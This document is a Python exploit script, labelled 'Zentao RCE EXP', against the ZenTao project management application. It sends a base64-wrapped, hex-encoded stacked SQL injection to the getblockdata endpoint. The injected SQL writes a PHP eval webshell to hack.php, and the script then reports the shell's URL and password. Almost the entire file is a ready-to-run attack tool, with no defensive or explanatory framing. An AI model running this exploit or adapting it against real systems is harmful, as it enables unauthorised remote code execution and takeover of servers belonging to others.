#!/usr/bin/python
#coding:utf-8

import argparse
from colorama import *
import requests
import binascii
import base64
import re

init(autoreset=True)


def banner():
	print("\033[0;32;40m\t\t\t\tZentao RCE EXP\033[0m")
	print("                       __                                         ")
	print(" ________ ____   _____/  |______    ____     _______  _________  ")
	print(" \___   // __ \ /    \   __\__  \  /  _ \  _/ __ \\  \/  /\____ \ ")
	print("  /    /\  ___/|   |  \  | / __  \(  <_> ) \  ___/>    < |  |_> > "+"\033[0;36;40m\t风起\033[0m")
	print(" /_____\ \\___ > ___|  /__|(____  / \____/   \___ > __/\_\|   __/ ")
	print("        \/   \/      \/        \/              \/      \/|__|    ")
	print("\033[0;33;40m\t\t\t\t干饭第一名\033[0m")
	print("\n")

	print("用法:")
	print("	--help:帮助文档")
	print("	-H:目标域名 (-H http://127.0.0.1)")

def exploit(host):
	try:
		header = {
		"Content-Type":"application/x-www-form-urlencoded",
		"Referer":host+"/zentao"
		}	
		sql=("select '<?php @eval($_POST[1])?>' into outfile 'C:/tmp/xampp/zentao/www/hack.php'")			#注意根据目标实际情况修改导出webshell的路径
		sql = sql.encode('utf-8')
		sql_hex=binascii.hexlify(sql).decode('utf-8')
		shell=r'{"orderBy":"order limit 1;SET @SQL=0x'+sql_hex+';PREPARE pord FROM @SQL;EXECUTE pord;-- -","num":"1,1","type":"openedbyme"}'
		shell_byte = bytes(shell,'utf-8')
		str_param=base64.b64encode(shell_byte)
		str_param=str(str_param)
		pattern = re.compile("'(.*)'")
		str_re1 = pattern.findall(str_param)
		url=host+"/zentao/index.php?m=block&f=main&mode=getblockdata&blockid=case&param="+str_re1[0]
		r=requests.get(url,headers=header)
		shell_url=host+"/zentao/hack.php"
		rx=requests.get(shell_url)
		if rx.status_code is 200:
			print("\nTrojan address is "+host+"/zentao/hack.php password is 1")
		else:
			print("Exploit利用失败")
	except:
		print("攻击函数利用失败!")
		pass
		
def start():
	try:
		banner()
		parser = argparse.ArgumentParser()
		parser.add_argument("-H","--host", help="目标域名")
		print("\n")
		args = parser.parse_args()
		if(args.host==None):
			print("\033[41m域名不能为空!")
			exit(0)
		host=args.host
		HttpError=args.host.find("http://")
		if HttpError is -1:
			print("\033[41m默认使用http协议如需指定https协议请在url前手动指定。")
			host="http://"+args.host
		exploit(host)
	except:
		print("主函数出现错误！")
		pass
if __name__=="__main__":
	start()
	